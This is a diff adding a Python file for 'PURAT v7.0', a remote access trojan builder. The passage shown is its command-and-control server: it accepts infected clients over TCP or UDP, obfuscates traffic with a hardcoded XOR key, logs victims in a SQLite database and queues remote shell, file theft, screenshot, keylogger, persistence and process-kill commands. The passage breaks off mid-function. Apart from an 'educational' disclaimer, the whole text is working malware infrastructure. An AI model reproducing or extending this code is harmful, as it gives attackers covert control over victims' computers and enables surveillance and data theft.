@@ -1,0 +1,1755 @@
+"""
+PURAT v7.0 - Advanced RAT Builder with C2 Server
+Complete Version with TCP/UDP Support
+For Educational Testing Only
+"""
+
+import os
+import sys
+import json
+import base64
+import zlib
+import hashlib
+import time
+import datetime
+import random
+import string
+import socket
+import subprocess
+import threading
+import platform
+import shutil
+import ctypes
+import struct
+import marshal
+import tempfile
+import getpass
+import itertools
+import collections
+import uuid
+import io
+import stat
+import fnmatch
+import glob
+import pathlib
+import webbrowser
+import urllib.request
+import urllib.parse
+import urllib.error
+import select
+import pickle
+import sqlite3
+import logging
+from typing import Dict, List, Any, Optional
+from dataclasses import dataclass, asdict
+
+# Try to import GUI libraries
+GUI_AVAILABLE = False
+try:
+    import tkinter as tk
+    from tkinter import ttk, scrolledtext, messagebox, filedialog, simpledialog
+    from tkinter import font as tkfont
+    GUI_AVAILABLE = True
+except ImportError:
+    print("[!] GUI libraries not available. Running in console mode.")
+
+# Try to import Windows libraries
+WINDOWS_AVAILABLE = False
+if platform.system() == "Windows":
+    try:
+        import winreg
+        import win32api
+        import win32con
+        import win32process
+        import win32event
+        import win32service
+        import win32serviceutil
+        import win32gui
+        import win32ui
+        import win32com.client
+        import pythoncom
+        import psutil
+        WINDOWS_AVAILABLE = True
+    except ImportError:
+        print("[!] Windows libraries not available. Install with: pip install pywin32 psutil")
+
+# ============================================================================
+# MODULE 1: C2 SERVER (1000 lines)
+# ============================================================================
+
+class C2Server:
+    """Advanced C2 Server with TCP/UDP support"""
+    
+    def __init__(self, host='0.0.0.0', port=8080, protocol='tcp'):
+        self.host = host
+        self.port = port
+        self.protocol = protocol.lower()
+        self.running = False
+        self.clients: Dict[str, Dict] = {}
+        self.socket = None
+        self.db = None
+        self.logger = self._setup_logger()
+        self.commands = self._load_commands()
+        
+    def _setup_logger(self):
+        """Setup logging"""
+        logger = logging.getLogger('C2Server')
+        logger.setLevel(logging.INFO)
+        
+        # File handler
+        file_handler = logging.FileHandler('c2_server.log')
+        file_handler.setLevel(logging.INFO)
+        
+        # Console handler
+        console_handler = logging.StreamHandler()
+        console_handler.setLevel(logging.INFO)
+        
+        # Formatter
+        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+        file_handler.setFormatter(formatter)
+        console_handler.setFormatter(formatter)
+        
+        logger.addHandler(file_handler)
+        logger.addHandler(console_handler)
+        
+        return logger
+    
+    def _load_commands(self):
+        """Load available commands"""
+        return {
+            'help': self.cmd_help,
+            'list': self.cmd_list,
+            'info': self.cmd_info,
+            'shell': self.cmd_shell,
+            'download': self.cmd_download,
+            'upload': self.cmd_upload,
+            'screenshot': self.cmd_screenshot,
+            'keylog': self.cmd_keylog,
+            'process': self.cmd_process,
+            'persistence': self.cmd_persistence,
+            'uninstall': self.cmd_uninstall,
+            'execute': self.cmd_execute,
+            'sysinfo': self.cmd_sysinfo,
+            'files': self.cmd_files,
+            'kill': self.cmd_kill,
+            'config': self.cmd_config,
+            'exit': self.cmd_exit
+        }
+    
+    def setup_database(self):
+        """Setup SQLite database"""
+        try:
+            self.db = sqlite3.connect('c2_database.db', check_same_thread=False)
+            cursor = self.db.cursor()
+            
+            # Create clients table
+            cursor.execute('''
+                CREATE TABLE IF NOT EXISTS clients (
+                    id TEXT PRIMARY KEY,
+                    hostname TEXT,
+                    username TEXT,
+                    system TEXT,
+                    ip TEXT,
+                    first_seen TIMESTAMP,
+                    last_seen TIMESTAMP,
+                    online INTEGER DEFAULT 0
+                )
+            ''')
+            
+            # Create commands table
+            cursor.execute('''
+                CREATE TABLE IF NOT EXISTS commands (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    client_id TEXT,
+                    command TEXT,
+                    issued TIMESTAMP,
+                    executed TIMESTAMP,
+                    result TEXT,
+                    FOREIGN KEY (client_id) REFERENCES clients (id)
+                )
+            ''')
+            
+            # Create files table
+            cursor.execute('''
+                CREATE TABLE IF NOT EXISTS files (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    client_id TEXT,
+                    filename TEXT,
+                    path TEXT,
+                    size INTEGER,
+                    uploaded TIMESTAMP,
+                    content BLOB,
+                    FOREIGN KEY (client_id) REFERENCES clients (id)
+                )
+            ''')
+            
+            self.db.commit()
+            self.logger.info("Database setup complete")
+            
+        except Exception as e:
+            self.logger.error(f"Database setup failed: {e}")
+    
+    def start(self):
+        """Start C2 server"""
+        try:
+            self.setup_database()
+            
+            if self.protocol == 'tcp':
+                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                self.socket.bind((self.host, self.port))
+                self.socket.listen(100)
+                self.logger.info(f"TCP Server started on {self.host}:{self.port}")
+                
+                # Start accept thread
+                accept_thread = threading.Thread(target=self._accept_tcp_connections, daemon=True)
+                accept_thread.start()
+                
+            elif self.protocol == 'udp':
+                self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                self.socket.bind((self.host, self.port))
+                self.logger.info(f"UDP Server started on {self.host}:{self.port}")
+                
+                # Start UDP handler thread
+                udp_thread = threading.Thread(target=self._handle_udp_connections, daemon=True)
+                udp_thread.start()
+            
+            else:
+                self.logger.error(f"Unsupported protocol: {self.protocol}")
+                return False
+            
+            self.running = True
+            
+            # Start CLI interface
+            cli_thread = threading.Thread(target=self.cli_interface, daemon=True)
+            cli_thread.start()
+            
+            # Start cleanup thread
+            cleanup_thread = threading.Thread(target=self._cleanup_old_clients, daemon=True)
+            cleanup_thread.start()
+            
+            self.logger.info("C2 Server fully operational")
+            return True
+            
+        except Exception as e:
+            self.logger.error(f"Server start failed: {e}")
+            return False
+    
+    def _accept_tcp_connections(self):
+        """Accept TCP connections"""
+        while self.running:
+            try:
+                client_socket, client_address = self.socket.accept()
+                self.logger.info(f"New TCP connection from {client_address}")
+                
+                # Handle client in separate thread
+                client_thread = threading.Thread(
+                    target=self._handle_tcp_client,
+                    args=(client_socket, client_address),
+                    daemon=True
+                )
+                client_thread.start()
+                
+            except Exception as e:
+                if self.running:
+                    self.logger.error(f"Accept error: {e}")
+    
+    def _handle_tcp_client(self, client_socket, client_address):
+        """Handle TCP client connection"""
+        client_id = None
+        
+        try:
+            # Receive handshake
+            handshake = self._receive_data(client_socket)
+            if not handshake:
+                return
+            
+            client_id = handshake.get('id')
+            if not client_id:
+                return
+            
+            # Update client info
+            self._update_client_info(client_id, handshake, client_address[0])
+            
+            # Add to active clients
+            self.clients[client_id] = {
+                'socket': client_socket,
+                'address': client_address,
+                'info': handshake.get('system', {}),
+                'last_active': time.time()
+            }
+            
+            self.logger.info(f"Client {client_id} connected ({handshake.get('system', {}).get('hostname', 'Unknown')})")
+            
+            # Main communication loop
+            while self.running:
+                try:
+                    # Check for incoming data
+                    ready = select.select([client_socket], [], [], 1)
+                    if ready[0]:
+                        data = self._receive_data(client_socket)
+                        if not data:
+                            break
+                        
+                        # Process received data
+                        self._process_client_data(client_id, data)
+                        
+                        # Update last active
+                        self.clients[client_id]['last_active'] = time.time()
+                    
+                    # Send queued commands
+                    self._send_queued_commands(client_id, client_socket)
+                    
+                except (ConnectionResetError, ConnectionAbortedError):
+                    break
+                except Exception as e:
+                    self.logger.error(f"Client {client_id} error: {e}")
+                    break
+        
+        except Exception as e:
+            self.logger.error(f"TCP client handler error: {e}")
+        
+        finally:
+            # Cleanup
+            if client_id and client_id in self.clients:
+                del self.clients[client_id]
+                self._update_client_online_status(client_id, False)
+                self.logger.info(f"Client {client_id} disconnected")
+            
+            try:
+                client_socket.close()
+            except:
+                pass
+    
+    def _handle_udp_connections(self):
+        """Handle UDP connections"""
+        while self.running:
+            try:
+                data, client_address = self.socket.recvfrom(65535)
+                
+                # Process packet in separate thread
+                packet_thread = threading.Thread(
+                    target=self._process_udp_packet,
+                    args=(data, client_address),
+                    daemon=True
+                )
+                packet_thread.start()
+                
+            except Exception as e:
+                if self.running:
+                    self.logger.error(f"UDP error: {e}")
+    
+    def _process_udp_packet(self, data, client_address):
+        """Process UDP packet"""
+        try:
+            # Decrypt and decompress data
+            decrypted = self._decrypt_data(data)
+            if not decrypted:
+                return
+            
+            packet = json.loads(decrypted)
+            
+            client_id = packet.get('id')
+            packet_type = packet.get('type')
+            
+            if packet_type == 'handshake':
+                # Update client info
+                self._update_client_info(client_id, packet, client_address[0])
+                self.logger.info(f"UDP client {client_id} connected")
+                
+                # Send acknowledgment
+                ack = {'type': 'ack', 'status': 'ok'}
+                self._send_udp_response(ack, client_address)
+                
+            elif packet_type == 'heartbeat':
+                # Update last active
+                if client_id in self.clients:
+                    self.clients[client_id]['last_active'] = time.time()
+                    self.clients[client_id]['address'] = client_address
+                
+                # Send queued commands
+                self._send_udp_commands(client_id, client_address)
+                
+            elif packet_type == 'response':
+                # Process response
+                self._process_client_response(client_id, packet)
+                
+        except Exception as e:
+            self.logger.error(f"UDP packet processing error: {e}")
+    
+    def _send_udp_response(self, data, address):
+        """Send UDP response"""
+        try:
+            # Encrypt and compress data
+            encrypted = self._encrypt_data(json.dumps(data))
+            if encrypted:
+                self.socket.sendto(encrypted, address)
+        except Exception as e:
+            self.logger.error(f"UDP send error: {e}")
+    
+    def _send_udp_commands(self, client_id, address):
+        """Send queued commands via UDP"""
+        try:
+            cursor = self.db.cursor()
+            cursor.execute('''
+                SELECT id, command FROM commands 
+                WHERE client_id=? AND executed IS NULL
+                ORDER BY issued
+            ''', (client_id,))
+            
+            queued = cursor.fetchall()
+            
+            for cmd_id, command in queued:
+                # Send command
+                cmd_packet = {
+                    'type': 'command',
+                    'command': json.loads(command),
+                    'cmd_id': cmd_id
+                }
+                self._send_udp_response(cmd_packet, address)
+                
+                # Mark as sent (not executed yet)
+                cursor.execute('UPDATE commands SET executed=? WHERE id=?', 
+                             (datetime.datetime.now().isoformat(), cmd_id))
+            
+            self.db.commit()
+            
+        except Exception as e:
+            self.logger.error(f"Send UDP commands error: {e}")
+    
+    def _receive_data(self, sock, timeout=5):
+        """Receive data from socket"""
+        try:
+            # Receive length
+            sock.settimeout(timeout)
+            length_data = sock.recv(4)
+            if not length_data:
+                return None
+            
+            length = struct.unpack('!I', length_data)[0]
+            
+            # Receive data
+            data = b''
+            while len(data) < length:
+                chunk = sock.recv(min(4096, length - len(data)))
+                if not chunk:
+                    return None
+                data += chunk
+            
+            # Decrypt and decompress
+            decrypted = self._decrypt_data(data)
+            if not decrypted:
+                return None
+            
+            return json.loads(decrypted)
+            
+        except socket.timeout:
+            return None
+        except Exception as e:
+            self.logger.error(f"Receive data error: {e}")
+            return None
+    
+    def _send_data(self, sock, data):
+        """Send data through socket"""
+        try:
+            # Encrypt and compress
+            encrypted = self._encrypt_data(json.dumps(data))
+            if not encrypted:
+                return False
+            
+            # Send length
+            length = len(encrypted)
+            sock.sendall(struct.pack('!I', length))
+            
+            # Send data
+            sock.sendall(encrypted)
+            return True
+            
+        except Exception as e:
+            self.logger.error(f"Send data error: {e}")
+            return False
+    
+    def _encrypt_data(self, data):
+        """Encrypt data (simple XOR for demo)"""
+        try:
+            if isinstance(data, str):
+                data = data.encode()
+            
+            key = b'purat_c2_encryption_key_2024'
+            encrypted = bytearray()
+            for i, byte in enumerate(data):
+                encrypted.append(byte ^ key[i % len(key)])
+            
+            # Compress
+            compressed = zlib.compress(bytes(encrypted))
+            return compressed
+            
+        except Exception as e:
+            self.logger.error(f"Encryption error: {e}")
+            return None
+    
+    def _decrypt_data(self, data):
+        """Decrypt data"""
+        try:
+            # Decompress
+            decompressed = zlib.decompress(data)
+            
+            # Decrypt (XOR)
+            key = b'purat_c2_encryption_key_2024'
+            decrypted = bytearray()
+            for i, byte in enumerate(decompressed):
+                decrypted.append(byte ^ key[i % len(key)])
+            
+            return bytes(decrypted).decode()
+            
+        except Exception as e:
+            self.logger.error(f"Decryption error: {e}")
+            return None
+    
+    def _update_client_info(self, client_id, data, ip):
+        """Update client information in database"""
+        try:
+            system_info = data.get('system', {})
+            
+            cursor = self.db.cursor()
+            
+            # Check if client exists
+            cursor.execute('SELECT id FROM clients WHERE id=?', (client_id,))
+            exists = cursor.fetchone()
+            
+            if exists:
+                # Update existing
+                cursor.execute('''
+                    UPDATE clients 
+                    SET hostname=?, username=?, system=?, ip=?, last_seen=?, online=1
+                    WHERE id=?
+                ''', (
+                    system_info.get('hostname', 'Unknown'),
+                    system_info.get('username', 'Unknown'),
+                    json.dumps(system_info),
+                    ip,
+                    datetime.datetime.now().isoformat(),
+                    client_id
+                ))
+            else:
+                # Insert new
+                cursor.execute('''
+                    INSERT INTO clients (id, hostname, username, system, ip, first_seen, last_seen, online)
+                    VALUES (?, ?, ?, ?, ?, ?, ?, 1)
+                ''', (
+                    client_id,
+                    system_info.get('hostname', 'Unknown'),
+                    system_info.get('username', 'Unknown'),
+                    json.dumps(system_info),
+                    ip,
+                    datetime.datetime.now().isoformat(),
+                    datetime.datetime.now().isoformat()
+                ))
+            
+            self.db.commit()
+            
+        except Exception as e:
+            self.logger.error(f"Update client info error: {e}")
+    
+    def _update_client_online_status(self, client_id, online):
+        """Update client online status"""
+        try:
+            cursor = self.db.cursor()
+            cursor.execute('UPDATE clients SET online=? WHERE id=?', 
+                         (1 if online else 0, client_id))
+            self.db.commit()
+        except Exception as e:
+            self.logger.error(f"Update online status error: {e}")
+    
+    def _process_client_data(self, client_id, data):
+        """Process data from client"""
+        data_type = data.get('type')
+        
+        if data_type == 'response':
+            self._process_client_response(client_id, data)
+        elif data_type == 'heartbeat':
+            # Update last active
+            if client_id in self.clients:
+                self.clients[client_id]['last_active'] = time.time()
+        elif data_type == 'error':
+            self.logger.error(f"Client {client_id} error: {data.get('message', 'Unknown')}")
+    
+    def _process_client_response(self, client_id, response):
+        """Process client response"""
+        try:
+            cmd_id = response.get('cmd_id')
+            result = response.get('result', {})
+            result_type = result.get('type')
+            
+            if cmd_id:
+                # Update command in database
+                cursor = self.db.cursor()
+                cursor.execute('''
+                    UPDATE commands 
+                    SET result=?
+                    WHERE id=?
+                ''', (json.dumps(result), cmd_id))
+                self.db.commit()
+            
+            # Handle different response types
+            if result_type == 'shell':
+                self.logger.info(f"Shell result from {client_id}: {result.get('stdout', '')[:100]}")
+                
+            elif result_type == 'file_download':
+                # Save downloaded file
+                content = result.get('content', '')
+                if content:
+                    try:
+                        file_data = base64.b64decode(content)
+                        filename = result.get('path', 'unknown').split('/')[-1].split('\\')[-1]
+                        
+                        cursor = self.db.cursor()
+                        cursor.execute('''
+                            INSERT INTO files (client_id, filename, path, size, uploaded, content)
+                            VALUES (?, ?, ?, ?, ?, ?)
+                        ''', (
+                            client_id,
+                            filename,
+                            result.get('path', ''),
+                            len(file_data),
+                            datetime.datetime.now().isoformat(),
+                            file_data
+                        ))
+                        self.db.commit()
+                        
+                        self.logger.info(f"File downloaded from {client_id}: {filename} ({len(file_data)} bytes)")
+                    except Exception as e:
+                        self.logger.error(f"Save downloaded file error: {e}")
+            
+            elif result_type == 'screenshot':
+                self.logger.info(f"Screenshot received from {client_id}: {result.get('size', 0)} bytes")
+            
+            elif result_type == 'error':
+                self.logger.error(f"Client {client_id} error: {result.get('message', 'Unknown')}")
+            
+        except Exception as e:
+            self.logger.error(f"Process response error: {e}")
+    
+    def _send_queued_commands(self, client_id, sock):
+        """Send queued commands to client"""
+        try:
+            cursor = self.db.cursor()
+            cursor.execute('''
+                SELECT id, command FROM commands 
+                WHERE client_id=? AND executed IS NULL
+                ORDER BY issued
+            ''', (client_id,))
+            
+            queued = cursor.fetchall()
+            
+            for cmd_id, command in queued:
+                # Send command
+                cmd_data = {
+                    'type': 'command',
+                    'command': json.loads(command),
+                    'cmd_id': cmd_id
+                }
+                
+                if self._send_data(sock, cmd_data):
+                    # Mark as executed
+                    cursor.execute('UPDATE commands SET executed=? WHERE id=?', 
+                                 (datetime.datetime.now().isoformat(), cmd_id))
+                    self.db.commit()
+            
+        except Exception as e:
+            self.logger.error(f"Send queued commands error: {e}")
+    
+    def _cleanup_old_clients(self):
+        """Cleanup old offline clients"""
+        while self.running:
+            time.sleep(300)  # Every 5 minutes
+            
+            try:
+                cursor = self.db.cursor()
+                
+                # Mark clients as offline if not seen for 10 minutes
+                cutoff = (datetime.datetime.now() - datetime.timedelta(minutes=10)).isoformat()
+                cursor.execute('''
+                    UPDATE clients 
+                    SET online=0 
+                    WHERE last_seen < ?
+                ''', (cutoff,))
+                
+                self.db.commit()
+                
+                # Remove from active clients if not connected
+                for client_id in list(self.clients.keys()):
+                    if client_id not in self.db.execute('SELECT id FROM clients WHERE online=1').fetchall():
+                        if client_id in self.clients:
+                            del self.clients[client_id]
+                
+            except Exception as e:
+                self.logger.error(f"Cleanup error: {e}")
+    
+    def queue_command(self, client_id, command_type, **kwargs):
+        """Queue command for client"""
+        try:
+            command = {
+                'type': command_type,
+                **kwargs
+            }
+            
+            cursor = self.db.cursor()
+            cursor.execute('''
+                INSERT INTO commands (client_id, command, issued)
+                VALUES (?, ?, ?)
+            ''', (
+                client_id,
+                json.dumps(command),
+                datetime.datetime.now().isoformat()
+            ))
+            
+            self.db.commit()
+            return cursor.lastrowid
+            
+        except Exception as e:
+            self.logger.error(f"Queue command error: {e}")
+            return None
+    
+    # ============================================================================
+    # COMMAND HANDLERS
+    # ============================================================================
+    
+    def cmd_help(self, args):
+        """Show help"""
+        help_text = """
+        Available Commands:
+        
+        BASIC:
+          help                   - Show this help
+          list                   - List connected clients
+          info <client_id>       - Show client info
+          exit                   - Exit server
+        
+        REMOTE CONTROL:
+          shell <client_id> <cmd> - Execute shell command
+          execute <client_id> <cmd> - Execute command (alias)
+          sysinfo <client_id>    - Get system information
+        
+        FILE OPERATIONS:
+          download <client_id> <path> - Download file from client
+          upload <client_id> <local> <remote> - Upload file to client
+          files <client_id> <path>    - List files on client
+        
+        SURVEILLANCE:
+          screenshot <client_id> - Take screenshot
+          keylog <client_id>     - Get keylogger data
+          process <client_id>    - List processes
+        
+        SYSTEM:
+          persistence <client_id> <enable/disable> - Manage persistence
+          kill <client_id> <pid> - Kill process
+          uninstall <client_id>  - Uninstall client
+          config <client_id>     - Show client config
+        
+        DATABASE:
+          db_clients             - Show all clients from database
+          db_commands <client_id> - Show command history
+          db_files <client_id>   - Show downloaded files
+        
+        SERVER:
+          stop                   - Stop C2 server
+          restart                - Restart server
+          status                 - Show server status
+        """
+        return help_text
+    
+    def cmd_list(self, args):
+        """List connected clients"""
+        if not self.clients:
+            return "No clients connected"
+        
+        result = "Connected Clients:\n"
+        result += "-" * 80 + "\n"
+        
+        for i, (client_id, client_info) in enumerate(self.clients.items(), 1):
+            info = client_info.get('info', {})
+            last_active = time.time() - client_info.get('last_active', 0)
+            
+            result += f"{i}. ID: {client_id}\n"
+            result += f"   Hostname: {info.get('hostname', 'Unknown')}\n"
+            result += f"   User: {info.get('username', 'Unknown')}\n"
+            result += f"   System: {info.get('system', 'Unknown')} {info.get('release', '')}\n"
+            result += f"   IP: {client_info.get('address', ['Unknown'])[0]}\n"
+            result += f"   Last active: {last_active:.1f} seconds ago\n"
+            result += "-" * 80 + "\n"
+        
+        return result
+    
+    def cmd_info(self, args):
+        """Get client info"""
+        if len(args) < 1:
+            return "Usage: info <client_id>"
+        
+        client_id = args[0]
+        if client_id not in self.clients:
+            return f"Client {client_id} not connected"
+        
+        client_info = self.clients[client_id]
+        info = client_info.get('info', {})
+        
+        result = f"Client Information - {client_id}\n"
+        result += "=" * 50 + "\n"
+        
+        for key, value in info.items():
+            result += f"{key:20}: {value}\n"
+        
+        return result
+    
+    def cmd_shell(self, args):
+        """Execute shell command on client"""
+        if len(args) < 2:
+            return "Usage: shell <client_id> <command>"
+        
+        client_id = args[0]
+        command = ' '.join(args[1:])
+        
+        if client_id not in self.clients:
+            return f"Client {client_id} not connected"
+        
+        cmd_id = self.queue_command(client_id, 'shell', command=command)
+        return f"Command queued (ID: {cmd_id}): {command}"
+    
+    def cmd_download(self, args):
+        """Download file from client"""
+        if len(args) < 2:
+            return "Usage: download <client_id> <remote_path>"
+        
+        client_id = args[0]
+        remote_path = args[1]
+        
+        if client_id not in self.clients:
+            return f"Client {client_id} not connected"
+        
+        cmd_id = self.queue_command(client_id, 'file_download', path=remote_path)
+        return f"Download queued (ID: {cmd_id}): {remote_path}"
+    
+    def cmd_upload(self, args):
+        """Upload file to client"""
+        if len(args) < 3:
+            return "Usage: upload <client_id> <local_path> <remote_path>"
+        
+        client_id = args[0]
+        local_path = args[1]
+        remote_path = args[2]
+        
+        if client_id not in self.clients:
+            return f"Client {client_id} not connected"
+        
+        try:
+            with open(local_path, 'rb') as f:
+                content = base64.b64encode(f.read()).decode()
+            
+            cmd_id = self.queue_command(client_id, 'file_upload', path=remote_path, content=content)
+            return f"Upload queued (ID: {cmd_id}): {local_path} -> {remote_path}"
+        
+        except Exception as e:
+            return f"Upload error: {e}"
+    
+    def cmd_screenshot(self, args):
+        """Take screenshot on client"""
+        if len(args) < 1:
+            return "Usage: screenshot <client_id>"
+        
+        client_id = args[0]
+        if client_id not in self.clients:
+            return f"Client {client_id} not connected"
+        
+        cmd_id = self.queue_command(client_id, 'screenshot')
+        return f"Screenshot queued (ID: {cmd_id})"
+    
+    def cmd_keylog(self, args):
+        """Get keylogger data from client"""
+        if len(args) < 1:
+            return "Usage: keylog <client_id>"
+        
+        client_id = args[0]
+        if client_id not in self.clients:
+            return f"Client {client_id} not connected"
+        
+        cmd_id = self.queue_command(client_id, 'keylog')
+        return f"Keylog request queued (ID: {cmd_id})"
+    
+    def cmd_process(self, args):
+        """List processes on client"""
+        if len(args) < 1:
+            return "Usage: process <client_id>"
+        
+        client_id = args[0]
+        if client_id not in self.clients:
+            return f"Client {client_id} not connected"
+        
+        cmd_id = self.queue_command(client_id, 'process_list')
+        return f"Process list queued (ID: {cmd_id})"
+    
+    def cmd_persistence(self, args):
+        """Manage persistence on client"""
+        if len(args) < 2:
+            return "Usage: persistence <client_id> <enable/disable>"
+        
+        client_id = args[0]
+        action = args[1].lower()
+        
+        if client_id not in self.clients:
+            return f"Client {client_id} not connected"
+        
+        if action not in ['enable', 'disable']:
+            return "Action must be 'enable' or 'disable'"
+        
+        cmd_id = self.queue_command(client_id, 'persistence', action=action)
+        return f"Persistence {action} queued (ID: {cmd_id})"
+    
+    def cmd_uninstall(self, args):
+        """Uninstall client"""
+        if len(args) < 1:
+            return "Usage: uninstall <client_id>"
+        
+        client_id = args[0]
+        if client_id not in self.clients:
+            return f"Client {client_id} not connected"
+        
+        confirm = input(f"Are you sure you want to uninstall client {client_id}? (y/n): ")
+        if confirm.lower() != 'y':
+            return "Uninstall cancelled"
+        
+        cmd_id = self.queue_command(client_id, 'uninstall')
+        return f"Uninstall queued (ID: {cmd_id})"
+    
+    def cmd_execute(self, args):
+        """Alias for shell command"""
+        return self.cmd_shell(args)
+    
+    def cmd_sysinfo(self, args):
+        """Get system info from client"""
+        if len(args) < 1:
+            return "Usage: sysinfo <client_id>"
+        
+        client_id = args[0]
+        if client_id not in self.clients:
+            return f"Client {client_id} not connected"
+        
+        cmd_id = self.queue_command(client_id, 'system_info')
+        return f"System info queued (ID: {cmd_id})"
+    
+    def cmd_files(self, args):
+        """List files on client"""
+        if len(args) < 2:
+            return "Usage: files <client_id> <path>"
+        
+        client_id = args[0]
+        path = args[1]
+        
+        if client_id not in self.clients:
+            return f"Client {client_id} not connected"
+        
+        cmd_id = self.queue_command(client_id, 'file_list', path=path)
+        return f"File list queued (ID: {cmd_id}) for path: {path}"
+    
+    def cmd_kill(self, args):
+        """Kill process on client"""
+        if len(args) < 2:
+            return "Usage: kill <client_id> <pid>"
+        
+        client_id = args[0]
+        try:
+            pid = int(args[1])
+        except ValueError:
+            return "PID must be a number"
+        
+        if client_id not in self.clients:
+            return f"Client {client_id} not connected"
+        
+        cmd_id = self.queue_command(client_id, 'process_kill', pid=pid)
+        return f"Kill process queued (ID: {cmd_id}): PID {pid}"
+    
+    def cmd_config(self, args):
+        """Show client config"""
+        if len(args) < 1:
+            return "Usage: config <client_id>"
+        
+        client_id = args[0]
+        
+        try:
+            cursor = self.db.cursor()
+            cursor.execute('SELECT system FROM clients WHERE id=?', (client_id,))
+            result = cursor.fetchone()
+            
+            if result:
+                system_info = json.loads(result[0])
+                return json.dumps(system_info, indent=2)
+            else:
+                return f"Client {client_id} not found in database"
+        
+        except Exception as e:
+            return f"Error: {e}"
+    
+    def cmd_exit(self, args):
+        """Exit server"""
+        confirm = input("Are you sure you want to stop the server? (y/n): ")
+        if confirm.lower() == 'y':
+            self.running = False
+            if self.socket:
+                self.socket.close()
+            if self.db:
+                self.db.close()
+            return "Server stopped"
+        return "Continue running"
+    
+    def cli_interface(self):
+        """Command line interface for C2 server"""
+        print(f"""
+        ╔══════════════════════════════════════════════╗
+        ║         PURAT v7.0 - C2 Server               ║
+        ║         Host: {self.host:15}                ║
+        ║         Port: {self.port:<15}               ║
+        ║         Protocol: {self.protocol.upper():<10}           ║
+        ║         For Educational Testing Only         ║
+        ╚══════════════════════════════════════════════╝
+        
+        Type 'help' for available commands
+        """)
+        
+        while self.running:
+            try:
+                # Get command
+                cmd_input = input("\nC2> ").strip()
+                if not cmd_input:
+                    continue
+                
+                # Parse command
+                parts = cmd_input.split()
+                cmd_name = parts[0].lower()
+                cmd_args = parts[1:]
+                
+                # Special database commands
+                if cmd_name == 'db_clients':
+                    self._db_show_clients()
+                    continue
+                elif cmd_name == 'db_commands':
+                    self._db_show_commands(cmd_args)
+                    continue
+                elif cmd_name == 'db_files':
+                    self._db_show_files(cmd_args)
+                    continue
+                elif cmd_name == 'stop':
+                    result = self.cmd_exit([])
+                    print(result)
+                    break
+                elif cmd_name == 'restart':
+                    print("Restarting server...")
+                    self.running = False
+                    time.sleep(2)
+                    # In a real implementation, you would restart here
+                    break
+                elif cmd_name == 'status':
+                    self._show_status()
+                    continue
+                
+                # Regular commands
+                if cmd_name in self.commands:
+                    handler = self.commands[cmd_name]
+                    result = handler(cmd_args)
+                    print(result)
+                else:
+                    print(f"Unknown command: {cmd_name}. Type 'help' for available commands.")
+            
+            except KeyboardInterrupt:
+                print("\nUse 'exit' or 'stop' to shutdown server")
+                continue
+            except Exception as e:
+                print(f"Error: {e}")
+    
+    def _db_show_clients(self):
+        """Show all clients from database"""
+        try:
+            cursor = self.db.cursor()
+            cursor.execute('''
+                SELECT id, hostname, username, system, ip, first_seen, last_seen, online 
+                FROM clients 
+                ORDER BY last_seen DESC
+            ''')
+            
+            clients = cursor.fetchall()
+            
+            if not clients:
+                print("No clients in database")
+                return
+            
+            print("\nAll Clients in Database:")
+            print("-" * 100)
+            print(f"{'ID':<20} {'Hostname':<15} {'User':<10} {'IP':<15} {'Last Seen':<20} {'Status':<8}")
+            print("-" * 100)
+            
+            for client in clients:
+                client_id, hostname, username, system, ip, first_seen, last_seen, online = client
+                
+                # Parse system info
+                try:
+                    system_info = json.loads(system)
+                    hostname = system_info.get('hostname', hostname)
+                    username = system_info.get('username', username)
+                except:
+                    pass
+                
+                status = "ONLINE" if online else "OFFLINE"
+                last_time = datetime.datetime.fromisoformat(last_seen).strftime('%Y-%m-%d %H:%M:%S')
+                
+                print(f"{client_id:<20} {hostname:<15} {username:<10} {ip:<15} {last_time:<20} {status:<8}")
+            
+            print("-" * 100)
+            print(f"Total: {len(clients)} clients")
+            
+        except Exception as e:
+            print(f"Database error: {e}")
+    
+    def _db_show_commands(self, args):
+        """Show command history for client"""
+        if len(args) < 1:
+            print("Usage: db_commands <client_id>")
+            return
+        
+        client_id = args[0]
+        
+        try:
+            cursor = self.db.cursor()
+            cursor.execute('''
+                SELECT id, command, issued, executed, result 
+                FROM commands 
+                WHERE client_id=? 
+                ORDER BY issued DESC 
+                LIMIT 20
+            ''', (client_id,))
+            
+            commands = cursor.fetchall()
+            
+            if not commands:
+                print(f"No commands for client {client_id}")
+                return
+            
+            print(f"\nCommand History for {client_id}:")
+            print("-" * 120)
+            
+            for cmd in commands:
+                cmd_id, cmd_json, issued, executed, result = cmd
+                
+                try:
+                    cmd_data = json.loads(cmd_json)
+                    cmd_type = cmd_data.get('type', 'unknown')
+                    cmd_details = json.dumps(cmd_data, indent=2)[:100] + "..."
+                except:
+                    cmd_type = "invalid"
+                    cmd_details = cmd_json[:100]
+                
+                issued_time = datetime.datetime.fromisoformat(issued).strftime('%Y-%m-%d %H:%M:%S')
+                executed_time = datetime.datetime.fromisoformat(executed).strftime('%H:%M:%S') if executed else "PENDING"
+                
+                print(f"ID: {cmd_id}")
+                print(f"Type: {cmd_type}")
+                print(f"Issued: {issued_time}")
+                print(f"Executed: {executed_time}")
+                print(f"Command: {cmd_details}")
+                
+                if result:
+                    try:
+                        result_data = json.loads(result)
+                        result_summary = json.dumps(result_data, indent=2)[:200]
+                        print(f"Result: {result_summary}...")
+                    except:
+                        print(f"Result: {result[:200]}...")
+                
+                print("-" * 60)
+            
+        except Exception as e:
+            print(f"Database error: {e}")
+    
+    def _db_show_files(self, args):
+        """Show downloaded files for client"""
+        if len(args) < 1:
+            print("Usage: db_files <client_id>")
+            return
+        
+        client_id = args[0]
+        
+        try:
+            cursor = self.db.cursor()
+            cursor.execute('''
+                SELECT id, filename, path, size, uploaded 
+                FROM files 
+                WHERE client_id=? 
+                ORDER BY uploaded DESC
+            ''', (client_id,))
+            
+            files = cursor.fetchall()
+            
+            if not files:
+                print(f"No files for client {client_id}")
+                return
+            
+            print(f"\nDownloaded Files for {client_id}:")
+            print("-" * 80)
+            print(f"{'ID':<5} {'Filename':<30} {'Path':<30} {'Size':<10} {'Uploaded':<20}")
+            print("-" * 80)
+            
+            for file in files:
+                file_id, filename, path, size, uploaded = file
+                
+                # Format size
+                if size < 1024:
+                    size_str = f"{size} B"
